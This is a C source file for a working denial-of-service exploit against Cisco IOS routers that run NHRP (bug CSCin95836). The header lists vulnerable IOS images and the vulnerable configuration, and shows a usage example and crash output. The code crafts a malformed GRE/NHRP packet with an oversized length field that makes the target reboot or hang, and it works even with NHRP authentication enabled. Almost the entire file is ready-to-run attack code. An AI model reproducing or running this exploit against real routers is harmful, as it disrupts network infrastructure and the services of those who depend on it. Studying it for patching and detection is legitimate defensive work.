/******************************************************************************/
/*                                                                            */
/* nhrp-dos - Copyright by Martin Kluge, <mk@elxsi.de>                        */
/*                                                                            */
/* Feel free to modify this code as you like, as long as you include the      */
/* above copyright statement.                                                 */
/*                                                                            */
/* Please use this code only to check your OWN cisco routers.                 */
/*                                                                            */
/* Cisco bug ID: CSCin95836                                                   */
/*                                                                            */
/* The Next-Hop-Resolution Protocol (NHRP) is defined in RFC2332. It is used  */
/* by a source host/router connected to a Non-Broadcast-Multi-Access (NBMA)   */
/* subnetwork to determine the internetworking layer address and NBMA         */
/* subnetwork addresses of the NBMA next hop towards the destination.         */
/* NHRP is often used for dynamic multipoint VPNs (DMVPN) in combination with */
/* IPSEC.                                                                     */
/*                                                                            */
/* URLs:                                                                      */
/* - [RFC2332/NHRP]       http://rfc.net/rfc2332.html                         */
/* - [RFC1701/GRE]        http://rfc.net/rfc1701.html                         */
/* - [DMVPNs with Cisco]  http://www.cisco.com/en/US/tech/tk583/tk372/techno  */
/*                        logies_white_paper09186a008018983e.shtml            */
/*                                                                            */
/* This code was only tested on FreeBSD and Linux, no warranty is or will be  */
/* provided.                                                                  */
/*                                                                            */
/* Vulnerable images (tested):                                                */
/*                                                                            */
/*  - c7100-jk9o3s-mz.123-12e.bin                                             */
/*  - c7200-jk8o3s-mz.122-40.bin                                              */
/*  - c3640-js-mz.122-15.T17.bin                                              */
/* (and many other IOS versions on different platforms)                       */
/*                                                                            */
/* Vulnerable configuration on cisco IOS:                                     */
/*                                                                            */
/* interface Tunnel0                                                          */
/*  ip address 10.0.0.1 255.255.255.128                                       */
/*  no ip redirects                                                           */
/*  no ip proxy-arp                                                           */
/*  ip mtu 1464                                                               */
/*  ip nhrp authentication mysecret                                           */
/*  ip nhrp network-id 1000                                                   */
/*  ip nhrp map multicast dynamic                                             */
/*  ip nhrp server-only                                                       */
/*  ip nhrp holdtime 30                                                       */
/*  tunnel source FastEthernet0/0                                             */
/*  tunnel mode gre multipoint                                                */
/*  tunnel key 123456789                                                      */
/*                                                                            */
/* This exploit works even if "ip nhrp authentication" is configured on the   */
/* cisco router. You can also specify a GRE key (use 0 to disable this        */
/* feature) if the GRE tunnel is protected. You don't need to know the        */
/* NHRP network id (or any other configuration details, except the GRE key if */
/* it is set on the target router).                                           */
/*                                                                            */
/* NOTE: The exploit only seems to work, if a NHRP session between the target */
/*       router and at least one client is established.                       */
/*                                                                            */
/* Code injection is also possible (thanks to sky for pointing this out), but */
/* it is not very easy and depends heavily on the IOS version / platform.     */
/*                                                                            */
/* Example:                                                                   */
/* root@elxsi# ./nhrp-dos vr0 x.x.x.x 123456789                               */
/*                                                                            */
/* Router console output:                                                     */
/*                                                                            */
/* -Traceback= 605D89A0 605D6B50 605BD974 605C08CC 605C2598 605C27E8          */
/* $0 : 00000000, AT : 62530000, v0 : 62740000, v1 : 62740000                 */
/* <snip>                                                                     */
/* EPC : 605D89A0, ErrorEPC : BFC01654, SREG : 3400FF03                       */
/* Cause 00000024 (Code 0x9): Breakpoint exception                            */
/*                                                                            */
/* Writing crashinfo to bootflash:crashinfo_20070321-155011                   */
/* === Flushing messages (16:50:12 CET Wed Mar 21 2007) ===                   */
/*                                                                            */
/* Router reboots or sometimes hangs ;)                                       */
/*                                                                            */
/*                                                                            */
/* Workaround: Disable NHRP ;)                                                */
/*                                                                            */
/* I'd like to thank the Cisco PSIRT and Clay Seaman-Kossmey for their help   */
/* regarding this issue.                                                      */
/*                                                                            */
/* Greetings fly to: sky, chilli, arbon, ripp, huega, gh0st, argonius, s0uls, */
/*                   xhr, bullet, nanoc, spekul, kaner, d, slobo, conny, H-Ra */
/*                   and #infiniteVOID                                        */
/*                                                                            */
/******************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>

/* BSD */
#define _BSD

/* Header sizes */
#define IP_HDR_SIZE     20
#define GRE_HDR_SIZE    4
#define GRE_KEY_SIZE    4
#define NHRP_HDR_SIZE   62

/* Function prototypes */
int open_socket (void);
int close_socket (int);
int send_dos(int, unsigned long, unsigned long, unsigned long);
unsigned long resolve_ip (char *);
unsigned long get_int_ipv4 (char *);

/* Globals */
int sockfd;
int nhrp_req_id;

/* GRE header */
struct gre_h {
        unsigned short flags;   /* GRE flags */
        unsigned short ptype;   /* GRE protocol type */
        unsigned int   key;     /* GRE key */
};

/* NHRP header */
struct nhrp_h { 
/* NHRP fixed header (20 bytes) */
        struct {
                unsigned short afn;             /* NHRP AFN */ 
                unsigned short proto;           /* NHRP protocol type */
                unsigned int   snap;            /* NHRP SNAP */
                unsigned short snapE:8;         /* NHRP SNAP */
                unsigned short hops:8;          /* NHRP hop count */
                unsigned short length;          /* NHRP total length */
                unsigned short checksum;        /* NHRP checksum */
                unsigned short mpoa_ext;        /* NHRP MPOA extensions */
                unsigned short version:8;       /* NHRP version */
                unsigned short type:8;          /* NHRP type */
                unsigned short nbma_addr:8;     /* NHRP t/l of NBMA address */
                unsigned short nbma_sub:8;      /* NHRP t/l of NBMA subaddr */
        } fixed; 

        /* NHRP mandatory part */
        struct {
                unsigned short src_len:8;       /* NHRP src protocol length */
                unsigned short dst_len:8;       /* NHRP dest protocol length */
                unsigned short flags;           /* NHRP flags */
                unsigned int   request_id;      /* NHRP request ID */
                unsigned long  client_nbma;     /* NHRP client NBMA address */
                unsigned long  client_nbma_sub; /* NHRP client NBMA subaddr */
                unsigned long  client_pro_addr; /* NHRP client protocol addr */
        } mand;

        /* NHRP client information entries (CIE) */
        union {
                struct {
                        unsigned short code:8;          /* NHRP code */
                        unsigned short pref_len:8;      /* NHRP prefix length */
                        unsigned short reserved;        /* NHRP reserved */
                        unsigned short mtu;             /* NHRP MTU */
                        unsigned short holding_time;    /* NHRP holding time */
                        unsigned short len_client:8;    /* NHRP t/l cl addr */
                        unsigned short len_client_sub:8;/* NHRP t/l cl sub */
                        unsigned short len_client_pro:8;/* NHRP t/l cl pro */
                        unsigned short preference:8;    /* NHRP preference */
                        unsigned short ext;             /* NHRP extension */
                } cie;
        };
};


/* Main function */
int main (int argc, char **argv) {
        /* Check command line */
        if(argc != 4) {
                fprintf(stderr, "\nnhrp-dos (c) by Martin Kluge <mk@elxsi.de>, 2007\n");
                fprintf(stderr, "------------------------------------------------\n");
                fprintf(stderr, "Usage: ./nhrp-dos <device> <target> <GRE key>\n");
                fprintf(stderr, "(Set GRE key = 0 to disable GRE keys!)\n\n");
                exit(EXIT_FAILURE);
        }

        /* Check UID */
        if(getuid() != 0 && geteuid() != 0) {
                fprintf(stderr, "Error: Please run as root!\n");
                exit(EXIT_FAILURE);
        }

        /* Open a socket */
        sockfd = open_socket();

        /* Send DoS packet */
        send_dos(sockfd, get_int_ipv4(argv[1]), resolve_ip(argv[2]), atoi(argv[3]));

        /* Close the socket */
        close_socket(sockfd);
        
        exit(EXIT_SUCCESS);
}


/* Open the socket */
int open_socket (void)
{
        int fd;
        int one = 1;
        void *ptr = &one;

        /* Open the socket */
        fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(fd < 0) {
                fprintf(stderr, "Error: open_socket: Unable to open socket.\n");
                exit(EXIT_FAILURE);
        }

        /* Set IP_HDRINCL to include the IPv4 header in outgoing packets. */
        /* Otherwise it would be done by the kernel. */
        if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, ptr, sizeof(one)) < 0) {
                fprintf(stderr, "Error: open_socket: setsockopt failed.\n");
                exit(EXIT_FAILURE);
        }

        #ifndef _BSD
        if(setsockopt(fd, IPPROTO_IP, SO_BROADCAST, ptr, sizeof(one)) < 0) {
                fprintf(stderr,"Error: open_socket: setsockopt failed.\n");
                exit(EXIT_FAILURE);
        }
        #endif

        return(fd);
}


/* Close the socket */
int close_socket (int fd)
{
        return(close(fd));
}


/* Resolve the hostname to IP address */
unsigned long resolve_ip (char *host)
{
        struct in_addr addr;
        struct hostent *host_ent;

        if((addr.s_addr = inet_addr(host)) == -1) {
                if(!(host_ent = gethostbyname(host)))
                        return(-1);

                memcpy((char *)&addr.s_addr, host_ent->h_addr, host_ent->h_length);
        }

        return(addr.s_addr);
}


/* Get IPv4 address of DEVICE */
unsigned long get_int_ipv4 (char *device)
{
        int tmp_fd;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        tmp_fd = socket(PF_INET, SOCK_DGRAM, 0);

        if(tmp_fd < 0) {
                fprintf(stderr, "Error: get_int_ipv4: socket failed.\n");
                exit(EXIT_FAILURE);
        }

        memset(&ifr, 0, sizeof(ifr));
        sin = (struct sockaddr_in *) &ifr.ifr_addr;
        strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));

        ifr.ifr_addr.sa_family = AF_INET;

        if(ioctl(tmp_fd, SIOCGIFADDR, (char *) &ifr) < 0) {
                fprintf(stderr, "Error: get_int_ipv4: ioctl failed.\n");
                exit(EXIT_FAILURE);
        }

        close(tmp_fd);
        return(sin->sin_addr.s_addr);
}


/* Send NHRP packet */
int send_dos (int fd, unsigned long src_ip, unsigned long dst_ip,
               unsigned long gre_key)
{
        struct ip ip_hdr;
        struct ip *iphdr;
        struct gre_h gre_hdr;
        struct nhrp_h nhrp_hdr;
        struct sockaddr_in sin;
        unsigned int bytes = 0;
        int GRE_SIZE = GRE_HDR_SIZE;

        /* Packet buffer */
        unsigned char *buf;

        if(gre_key!=0)
                GRE_SIZE+=GRE_KEY_SIZE;

        /* Allocate some memory */
        buf = malloc(IP_HDR_SIZE+GRE_SIZE+NHRP_HDR_SIZE);

        if(buf < 0) {
                fprintf(stderr, "Error: send_dos: malloc failed.\n");
                exit(EXIT_FAILURE);
        }

        /* Increment NHRP request ID */
        nhrp_req_id++;

        /* IPv4 Header */
        ip_hdr.ip_v             = 4;                    /* IP version */
        ip_hdr.ip_hl            = 5;                    /* IP header length */
        ip_hdr.ip_tos           = 0x00;                 /* IP ToS */
        ip_hdr.ip_len           = htons(IP_HDR_SIZE  +
                                   GRE_SIZE +
                                   NHRP_HDR_SIZE
                                  );                    /* IP total length */
        ip_hdr.ip_id            = 0;                    /* IP identification */
        ip_hdr.ip_off           = 0;                    /* IP frag offset */
        ip_hdr.ip_ttl           = 64;                   /* IP time to live */
        ip_hdr.ip_p             = IPPROTO_GRE;          /* IP protocol */
        ip_hdr.ip_sum           = 0;                    /* IP checksum */
        ip_hdr.ip_src.s_addr    = src_ip;               /* IP source */
        ip_hdr.ip_dst.s_addr    = dst_ip;               /* IP destination */

        /* GRE header */
        if(gre_key != 0) {
                gre_hdr.flags   = htons(0x2000);        /* GRE flags */
                gre_hdr.key     = htonl(gre_key);       /* GRE key */
        } else {
                gre_hdr.flags   = 0;
        }

        gre_hdr.ptype           = htons(0x2001);        /* GRE type (NHRP) */

        /* NHRP fixed header */
        nhrp_hdr.fixed.afn      = htons(0x0001);        /* NHRP AFN */
        nhrp_hdr.fixed.proto    = htons(0x0800);        /* NHRP protocol type */
        nhrp_hdr.fixed.snap     = 0;                    /* NHRP SNAP */
        nhrp_hdr.fixed.snapE    = 0;                    /* NHRP SNAP */
        nhrp_hdr.fixed.hops     = 0xFF;                 /* NHRP hop count */

        /* DoS -> Set length to 0xFFFF */
        nhrp_hdr.fixed.length   = htons(0xFFFF);        /* NHRP length */

        /* Checksum can be incorrect */
        nhrp_hdr.fixed.checksum = 0;                    /* NHRP checksum */

        nhrp_hdr.fixed.mpoa_ext = htons(0x0034);        /* NHRP MPOA ext */
        nhrp_hdr.fixed.version  = 1;                    /* NHRP version */
        nhrp_hdr.fixed.type     = 3;                    /* NHRP type */
        nhrp_hdr.fixed.nbma_addr= 4;                    /* NHRP NBMA t/l addr */
        nhrp_hdr.fixed.nbma_sub = 0;                    /* NHRP NBMA t/l sub */

        /* NHRP mandatory part */
        nhrp_hdr.mand.src_len   = 4;                    /* NHRP src proto len */
        nhrp_hdr.mand.dst_len   = 4;                    /* NHRP dst proto len */
        nhrp_hdr.mand.flags     = htons(0x8000);        /* NHRP flags */
        nhrp_hdr.mand.request_id  = htonl(nhrp_req_id); /* NHRP request ID */
        nhrp_hdr.mand.client_nbma = src_ip;             /* NHRP client addr */
        nhrp_hdr.mand.client_nbma_sub = 0;              /* NHRP client sub  */
        nhrp_hdr.mand.client_pro_addr = 0;              /* NHRP client proto */ 

        /* NHRP client information entries (CIE) */
        nhrp_hdr.cie.code       = 0;                    /* NHRP code */
        nhrp_hdr.cie.pref_len   = 0xFF;                 /* NHRP prefix len */
        nhrp_hdr.cie.reserved   = 0x0000;               /* NHRP reserved */
        nhrp_hdr.cie.mtu        = htons(1514);          /* NHRP mtu */
        nhrp_hdr.cie.holding_time = htons(30);          /* NHRP holding time */
        nhrp_hdr.cie.len_client = 0;                    /* NHRP t/l client */
        nhrp_hdr.cie.len_client_sub = 0;                /* NHRP t/l sub */
        nhrp_hdr.cie.len_client_pro = 0;                /* NHRP t/l pro */
        nhrp_hdr.cie.preference = 0;                    /* NHRP preference */
        nhrp_hdr.cie.ext        = htons(0x8003);        /* NHRP C/U/Type (ext)*/


        /* Copy the IPv4 header to the buffer */
        memcpy(buf, (unsigned char *) &ip_hdr, sizeof(ip_hdr));

        /* Copy the GRE header to the buffer */
        memcpy(buf + IP_HDR_SIZE, (unsigned char *) &gre_hdr, sizeof(gre_hdr));

        /* Copy the NHRP header to the buffer */
        memcpy(buf + IP_HDR_SIZE + GRE_SIZE, (unsigned char *) &nhrp_hdr,
                sizeof(nhrp_hdr));

        /* Fix some BSD bugs */
        #ifdef _BSD
        iphdr = (struct ip *) buf;
        iphdr->ip_len = ntohs(iphdr->ip_len);
        iphdr->ip_off = ntohs(iphdr->ip_off);
        #endif

        memset(&sin, 0, sizeof(struct sockaddr_in));
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = iphdr->ip_dst.s_addr;

        printf("\nnhrp-dos (c) by Martin Kluge <mk@elxsi.de>, 2007\n");
        printf("------------------------------------------------\n");
        printf("Sending DoS packet...");

        /* Send the packet */
        bytes = sendto(fd, buf, IP_HDR_SIZE + GRE_SIZE + NHRP_HDR_SIZE, 0,
                        (struct sockaddr *) &sin, sizeof(struct sockaddr));

        printf("DONE (%d bytes)\n\n", bytes);

        /* Free the buffer */
        free(buf);

        /* Return number of bytes */
        return(bytes);
}

